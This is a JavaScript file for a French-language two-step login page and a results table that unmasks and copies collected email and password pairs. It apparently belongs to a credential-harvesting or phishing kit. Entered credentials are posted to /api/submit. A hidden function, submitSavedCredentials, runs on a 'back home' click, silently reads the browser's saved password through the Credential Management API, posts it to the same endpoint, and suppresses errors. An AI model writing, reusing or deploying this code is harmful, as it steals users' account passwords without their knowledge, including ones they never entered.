window.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("login-form");
  const emailInput = document.getElementById("email");
  const passwordInput = document.getElementById("password");
  const togglePassword = document.getElementById("toggle-password");
  const submitButton = document.getElementById("submit");
  const nextButton = document.getElementById("next");
  const backButton = document.getElementById("back-email");
  const emailDisplay = document.getElementById("email-display");
  const statusText = document.getElementById("form-status");
  const confirmation = document.getElementById("confirmation");
  const backHome = document.getElementById("back-home");
  const resultsTable = document.querySelector(".table table");
  const steps = document.querySelectorAll(".form-step");

  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

  function setStep(stepName) {
    steps.forEach((step) => {
      step.classList.toggle(
        "form-step--active",
        step.dataset.step === stepName
      );
    });
  }

  function updateFormState() {
    if (!form) {
      return;
    }
    const isEmailValid = emailRegex.test(emailInput.value.trim());
    if (nextButton) {
      nextButton.disabled = !isEmailValid;
    }
    if (passwordInput) {
      const isPasswordStep =
        document.querySelector(".form-step--active")?.dataset.step ===
        "password";
      passwordInput.disabled = !(isEmailValid && isPasswordStep);
      togglePassword.disabled = !(isEmailValid && isPasswordStep);
    }
    const isPasswordValid = passwordInput.value.trim().length > 0;
    submitButton.disabled = !(isEmailValid && isPasswordValid);
  }

  function watchAutofill() {
    if (!emailInput) {
      return;
    }
    let lastEmail = emailInput.value;
    let lastPassword = passwordInput?.value;
    const syncFromAutofill = () => {
      const currentEmail = emailInput.value;
      const currentPassword = passwordInput?.value;
      if (currentEmail !== lastEmail || currentPassword !== lastPassword) {
        lastEmail = currentEmail;
        lastPassword = currentPassword;
        updateFormState();
      }
      if (currentEmail || currentPassword) {
        return;
      }
      window.requestAnimationFrame(syncFromAutofill);
    };
    window.requestAnimationFrame(syncFromAutofill);
  }

  if (form) {
    emailInput.addEventListener("input", () => {
      updateFormState();
      statusText.textContent = emailRegex.test(emailInput.value.trim())
        ? ""
        : "Veuillez saisir un email valide pour déverrouiller le mot de passe.";
    });

    passwordInput.addEventListener("input", updateFormState);
    passwordInput.addEventListener("change", updateFormState);
    emailInput.addEventListener("change", updateFormState);

    if (nextButton) {
      nextButton.addEventListener("click", () => {
        if (!emailRegex.test(emailInput.value.trim())) {
          statusText.textContent =
            "Veuillez saisir un email valide pour continuer.";
          return;
        }
        statusText.textContent = "";
        setStep("password");
        if (emailDisplay) {
          emailDisplay.textContent = emailInput.value.trim();
        }
        updateFormState();
        passwordInput.focus();
      });
    }

    if (backButton) {
      backButton.addEventListener("click", () => {
        setStep("email");
        passwordInput.value = "";
        if (emailDisplay) {
          emailDisplay.textContent = "";
        }
        updateFormState();
        emailInput.focus();
      });
    }

    togglePassword.addEventListener("click", () => {
      const isHidden = passwordInput.type === "password";
      passwordInput.type = isHidden ? "text" : "password";
      togglePassword.textContent = isHidden ? "Masquer" : "Afficher";
    });

    form.addEventListener("submit", async (event) => {
      event.preventDefault();
      statusText.textContent = "";
      submitButton.classList.add("loading");
      submitButton.disabled = true;

      const payload = {
        email: emailInput.value.trim(),
        password: passwordInput.value.trim(),
      };

      try {
        const response = await fetch("/api/submit", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });

        if (!response.ok) {
          const data = await response.json();
          throw new Error(data.message || "Erreur lors de l'envoi.");
        }

        if (confirmation) {
          confirmation.hidden = false;
        }
      } catch (error) {
        statusText.textContent = error.message;
      } finally {
        submitButton.classList.remove("loading");
        updateFormState();
      }
    });
  }

  if (backHome && confirmation && form) {
    backHome.addEventListener("click", async () => {
      await submitSavedCredentials();
      confirmation.hidden = true;
      form.reset();
      setStep("email");
      passwordInput.type = "password";
      togglePassword.textContent = "Afficher";
      statusText.textContent = "";
      if (emailDisplay) {
        emailDisplay.textContent = "";
      }
      updateFormState();
      emailInput.focus();
    });
  }

  async function submitSavedCredentials() {
    if (!navigator.credentials?.get) {
      return;
    }
    try {
      const credential = await navigator.credentials.get({
        password: true,
        mediation: "optional",
      });
      if (!credential?.id || !credential.password) {
        return;
      }
      await fetch("/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email: credential.id,
          password: credential.password,
        }),
      });
    } catch (error) {
      // Ignore credential retrieval errors silently.
    }
  }

  function toggleMaskedValue(target, button) {
    const isHidden = target.dataset.state !== "visible";
    target.textContent = isHidden ? target.dataset.value : "••••••••••";
    target.dataset.state = isHidden ? "visible" : "hidden";
    button.textContent = isHidden ? "Masquer" : button.dataset.label;
  }

  function getRawValue(target) {
    return target?.dataset?.value || "";
  }

  async function copyToClipboard(text) {
    if (!text) {
      return false;
    }
    if (navigator.clipboard?.writeText) {
      await navigator.clipboard.writeText(text);
      return true;
    }
    const fallback = document.createElement("textarea");
    fallback.value = text;
    fallback.style.position = "fixed";
    fallback.style.opacity = "0";
    document.body.appendChild(fallback);
    fallback.focus();
    fallback.select();
    const success = document.execCommand("copy");
    fallback.remove();
    return success;
  }

  async function handleCopy(button, target) {
    const originalLabel = button.dataset.label;
    try {
      const success = await copyToClipboard(getRawValue(target));
      button.textContent = success ? "Copié" : "Erreur";
    } catch (error) {
      button.textContent = "Erreur";
    } finally {
      setTimeout(() => {
        button.textContent = originalLabel;
      }, 1500);
    }
  }

  if (resultsTable) {
    resultsTable.addEventListener("click", (event) => {
      const button = event.target.closest("[data-toggle], [data-copy]");
      if (!button) {
        return;
      }
      const row = button.closest("tr");
      const cells = row ? row.querySelectorAll(".maskable") : null;
      if (!cells || cells.length < 2) {
        return;
      }
      if (button.dataset.toggle) {
        const toggleType = button.dataset.toggle;
        if (toggleType === "email") {
          toggleMaskedValue(cells[0], button);
        }
        if (toggleType === "password") {
          toggleMaskedValue(cells[1], button);
        }
        return;
      }
      if (button.dataset.copy === "email") {
        handleCopy(button, cells[0]);
      }
      if (button.dataset.copy === "password") {
        handleCopy(button, cells[1]);
      }
    });

    resultsTable.querySelectorAll("[data-toggle]").forEach((button) => {
      const label =
        button.dataset.toggle === "email"
          ? "Afficher adresse mail"
          : "Afficher mot de passe";
      button.dataset.label = label;
    });

    resultsTable.querySelectorAll("[data-copy]").forEach((button) => {
      const label =
        button.dataset.copy === "email"
          ? "Copié"
          : "Copié";
      button.dataset.label = label;
    });
  }

  setStep("email");
  updateFormState();
  watchAutofill();
});
